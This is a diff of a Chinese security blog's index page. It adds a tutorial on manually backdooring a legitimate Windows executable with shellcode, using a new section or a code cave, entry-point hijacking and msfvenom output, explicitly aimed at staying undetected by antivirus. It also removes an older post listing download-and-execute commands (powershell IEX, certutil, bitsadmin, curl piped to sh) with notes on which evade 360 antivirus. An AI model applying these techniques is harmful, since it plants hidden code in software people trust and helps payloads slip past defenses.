@@ -599,6 +599,251 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/12/27/手工shellcode注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/27/手工shellcode注入/" itemprop="url">手工shellcode注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-27T12:12:57+08:00">
+                2019-12-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/bypass/" itemprop="url" rel="index">
+                    <span itemprop="name">bypass</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>本人首发于先知社区</p>
+<h1 id="手工shellcode注入"><a href="#手工shellcode注入" class="headerlink" title="手工shellcode注入"></a>手工shellcode注入</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><blockquote>
+<ul>
+<li>这篇文章将介绍如何添加我们的shellcode而不增加大小或更改功能的来对合法的可执行文件进行添加后门。</li>
+<li>我们可以使用自己的Shellcode注入到特定的可执行文件，而又不增加可执行文件的大小或更改其预期功能，并使其难以检测。</li>
+</ul>
+</blockquote>
+<p><strong><em>为了保证shellcode和程序的精简</em></strong></p>
+<ul>
+<li>shellcode不会经过任何编码器的混淆</li>
+<li>文件大小保持不变。</li>
+<li>后门程序的功能不受影响</li>
+</ul>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><ul>
+<li>ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。</li>
+</ul>
+<blockquote>
+<p>所以我们需要先检查程序是否开启了ASLR</p>
+</blockquote>
+<p>![avatar](C:\Users\Mr. j\Desktop\1.png)</p>
+<p>PS脚本地址：<a href="https://github.com/NetSPI/PESecurity">https://github.com/NetSPI/PESecurity</a></p>
+<p>看来这是一个好靶子。</p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><strong><em>实现过程</em></strong></p>
+<ul>
+<li><p>在代码区段中创建新的节头，或在内存中找到合适的位置植入我们的Shell代码，这两种方法均在下面演示。</p>
+</li>
+<li><p>在程序执行开始时从堆栈中复制操作码。</p>
+</li>
+<li><p>将这些指令替换为我们自己的操作码，以将应用程序的执行流劫持到内存中的所需位置。</p>
+</li>
+<li><p>将shellcode添加到该内存位置。</p>
+</li>
+<li><p>将寄存器设置回第一步中复制的堆栈，以正常执行流程。</p>
+</li>
+</ul>
+<h4 id="添加新的区段"><a href="#添加新的区段" class="headerlink" title="添加新的区段"></a>添加新的区段</h4><blockquote>
+<p>该方法背后的原理是在PE文件中创建一个新的区段，在新创建的区段中添加我们的shellcode，然后指向该部分的执行流程。可以使用诸如LordPE之类的工具来修改区段表。</p>
+</blockquote>
+<ul>
+<li>用Lord PE打开目标程序，并在区段表底部添加节标题（这里是.demo)</li>
+<li>将虚拟大小和原始大小相加1000字节。请注意，十六进制为1000（十进制为4096字节）。</li>
+<li>使该区段可执行，因为我们必须将Shellcode放在此节中，因此它必须是可读可写可执行的。</li>
+<li>将文件另存为原始文件。</li>
+</ul>
+<p>![avatar](C:\Users\Mr. j\Desktop\2.png)</p>
+<p><strong><em>现在执行该文件，它将无法运行，因为我们添加了一个1000h字节的新段，但是该区段为空。</em></strong></p>
+<p>![avatar](C:\Users\Mr. j\Desktop\3.png)</p>
+<p><strong><em>所以只要我们填充了该区段就能正常执行。</em></strong></p>
+<p>所以我们在文件末尾添加1000h字节，因为现在文件包含一个1000字节的区段，但该部分为空，我们必须用什么填充它，现在选择用<strong>null（00）</strong>填充它。如下所示，使用任何十六进制编辑器在文件末尾添加1000个十六进制字节。</p>
+<p>![avatar](C:\Users\Mr. j\Desktop\4.png)</p>
+<p>添加后保存并运行，此时程序就可以正常运行了（确保程序可执行后进入下一步）。</p>
+<h4 id="劫持执行流程"><a href="#劫持执行流程" class="headerlink" title="劫持执行流程"></a>劫持执行流程</h4><p>现在在Ollydbg中执行以下操作：转到内存部分，然后双击PE标头。</p>
+<p>![avatar](C:\Users\Mr. j\Desktop\5.png)</p>
+<p>我们可以看到我们的新部分 <strong>.demo</strong> 已添加了指定的权限。下一步是将程序的执行流劫持到我们新添加的 <strong>.demo</strong> 段中。当我们执行程序时，它应指向 要放置shellcode的代码的<strong>.demo</strong> 部分。 </p>
+<p><strong>首先复制前3个操作码到记事本，稍后在恢复执行流程时将需要它们。</strong> 我们复制 <strong>.demo</strong>的起始地址<strong>00412000</strong> 打开Ollydbg的程序，更换程序起始地址代码为JMP 00412000。</p>
+<p>![avatar](C:\Users\Mr. j\Desktop\6.png)</p>
+<p>现在保存修改后的文件，此时文件的执行流程已经被劫持了。现在重新用Ollydbg打开，右键跟随jmp，你就会发现程序已经被劫持到我们所创建的那一片全为00的了。</p>
+<blockquote>
+<p>msfvenom -p windows/messagebox  text=”it’s demo” -f hex</p>
+</blockquote>
+<p>右键复制到可执行文件，此时会进入数据块，使用msf生成payload，复制，在Ollydbg中选中那一块00段  <strong>右键 &gt; 二进制 &gt;二进制粘贴</strong>然后保存文件</p>
+<p>![avatar](C:\Users\Mr. j\Desktop\7.png)</p>
+<p>此时修改后的程序就能成功执行我们的shellcode了。弹框证明。</p>
+<p>![avatar](C:\Users\Mr. j\Desktop\8.png)</p>
+<p>此时shellcode已被执行，我们应该恢复程序正常的执行流程。</p>
+<ul>
+<li>将shellcode最后一句跳转改为nop.</li>
+<li>使用popfd，popod进行恢复堆栈的操作。</li>
+<li>然后将原程序起始位置的汇编码复制到这里。</li>
+<li>最后跳转回原来的执行地址。</li>
+<li>保存文件，程序应能正常工作并保留原有功能。</li>
+</ul>
+<p>![avatar](C:\Users\Mr. j\Desktop\9.png)</p>
+<p><strong>* 此时我们算是初步完成了，不过由于添加了新的区段导致了程序体积变大，所以我们会用另一种办法解决这个问题 *</strong></p>
+<p>事实上虽然程序大小有变化，但是我们可以无限制的放入shellcode，即我们可以使用复杂的shellcode，这将会对bypass AV有帮助。</p>
+<h4 id="代码空洞"><a href="#代码空洞" class="headerlink" title="代码空洞"></a>代码空洞</h4><blockquote>
+<p>代码空洞是程序存储器中的空块，可用于注入shellcode。我们可以使用现有的代码洞来植入我们的shellcode。我们几乎可以在任何PE中找到不同大小的代码空洞。<strong>代码空洞的大小很重要！</strong> 我们希望代码空洞大于我们的shellcode，以便我们可以注入shellcode，而不必将其拆分为较小的块。</p>
+</blockquote>
+<p>在代码空洞中注入shellcode是不会影响程序大小的，唯一需要注意的是shellcode应尽可能的小。</p>
+<p>在kali中使用cave_miner检查原程序（未经修改）是否存在代码空洞。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cave_miner search  <span class="regexp">/root/</span>Hash.exe   <span class="comment">#可用--size 筛选符合大小的空洞，适用于空洞特别多的程序。</span></span><br></pre></td></tr></table></figure>
+
+<p>![avatar](C:\Users\Mr. j\Desktop\10.png)</p>
+<p>在这里我们有一个899字节的空洞，就决定是它了。</p>
+<blockquote>
+<p>记下空洞的虚拟地址。虚拟地址是洞穴的起始地址。我们将通过跳转到虚拟地址来劫持执行流程。现在我们需要将shellcode植入到空洞中。在这里可以看到代码洞穴仅是可读的，我们必须使其可写和可执行才能执行我们的shellcode。我们通过LORDPE来修改。</p>
+</blockquote>
+<p>![avatar](C:\Users\Mr. j\Desktop\11.png)</p>
+<h3 id="在用户交互时触发Shellcode"><a href="#在用户交互时触发Shellcode" class="headerlink" title="在用户交互时触发Shellcode"></a>在用户交互时触发Shellcode</h3><p>现在我们有了一个可以使用的代码空洞，所以就决定把shellcode放这里了。</p>
+<p>此次汇编代码改为跳转到我们得到的空洞地址：<strong>jmp 0041123d</strong> ，保存</p>
+<p>再次用Ollydbg打开，跟随jmp到我们的代码空洞。</p>
+<p>![avatar](C:\Users\Mr. j\Desktop\12.png)</p>
+<p><strong>右键&gt;复制到可执行文件&gt;选择</strong>，然后复制shellcode，<strong>右键&gt;二进制&gt;二进制粘贴</strong></p>
+<p>然后最后一句还是改为<strong>nop</strong>,然后添加<strong>popfd</strong>,<strong>popad</strong>,以恢复堆栈，然后保存。</p>
+<p>![avatar](C:\Users\Mr. j\Desktop\13.png)</p>
+<p>如能正常执行shellcode即进入下一步，跳转回程序执行流程。</p>
+<p>最后完整还原代码如图。</p>
+<p>![avatar](C:\Users\Mr. j\Desktop\14.png)</p>
+<p>![avatar](C:\Users\Mr. j\Desktop\15.png)</p>
+<p>在文件大小不变的情况下，实现了shellcode注入，且程序功能不受影响。</p>
+<p>参考链接：<a href="https://haiderm.com/fully-undetectable-backdooring-pe-file" target="_blank" rel="noopener">https://haiderm.com/fully-undetectable-backdooring-pe-file</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/12/02/Win绕过AV添加账号/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2726,176 +2971,6 @@ Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/09/10/命令行文件下载的各种姿势/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/09/10/命令行文件下载的各种姿势/" itemprop="url">命令行文件下载的各种姿势</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-10T12:10:57+08:00">
-                2019-09-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/命令行/" itemprop="url" rel="index">
-                    <span itemprop="name">命令行</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="命令行文件下载的各种姿势"><a href="#命令行文件下载的各种姿势" class="headerlink" title="命令行文件下载的各种姿势"></a>命令行文件下载的各种姿势</h1><h2 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h2><ul>
-<li>​       <a href>bitsadmin /rawreturn /transfer down “http://172.22.35.212/payload1.xml”  C:\1.txt</a> </li>
-<li>​       bitsadmin /transferdown /download /prioritynomal “<a href="http://172.22.35.212/payload1.xml&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;</a> C:\1.txt  –进度条</li>
-</ul>
-<p>会引发360弹窗。</p>
-<h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><ul>
-<li>wget -i <a href="http://192.168.0.1/demo.exe" target="_blank" rel="noopener">http://192.168.0.1/demo.exe</a></li>
-</ul>
-<p>360下有弹窗</p>
-<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><ul>
-<li>curl -O <a href="http://192.168.0.1/demo.exe" target="_blank" rel="noopener">http://192.168.0.1/demo.exe</a></li>
-<li>curl <a href="http://192.168.0.107/1.sh" target="_blank" rel="noopener">http://192.168.0.107/1.sh</a> -o- | sh  –sh脚本执行</li>
-</ul>
-<p>360下有弹窗</p>
-<h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><ul>
-<li>powershell.exe “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://172.22.35.212/payload1.xml&#39;)&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&#39;)&quot;</a> | out-file payload.xm</li>
-<li>Invoke-WebRequest -Uri  “<a href="http://172.22.35.212/payload1.xml&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;</a>  -OutFile ‘pay.txt’ -UseBasicParsing</li>
-<li>powershell -w hidden Invoke-WebRequest -uri <a href="http://172.22.35.106/PAYLOAD1.XML" target="_blank" rel="noopener">http://172.22.35.106/PAYLOAD1.XML</a> -OutFile 1025.xml</li>
-<li>(New-Object System.Net.WebClient).downloadfile(“<a href="http://172.22.35.212/payload1.xml&quot;,&#39;C:\Users\18130\OneDrive\桌面\1.txt&#39;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;,&#39;C:\Users\18130\OneDrive\桌面\1.txt&#39;</a>)</li>
-</ul>
-<p>第四条360无弹窗</p>
-<h2 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h2><ul>
-<li>certutil -urlcache -split -f <a href="http://172.22.35.212/payload1.xml" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml</a> </li>
-<li>certutil -urlcache -split -f <a href="http://172.22.35.212/payload1.xml" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml</a> delete –清除痕迹</li>
-</ul>
-<p>360下无弹窗<br>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/04/%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/1.jpg" alt="avatar"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-    <div>
-          
-    </div>
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2948,7 +3023,7 @@ Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
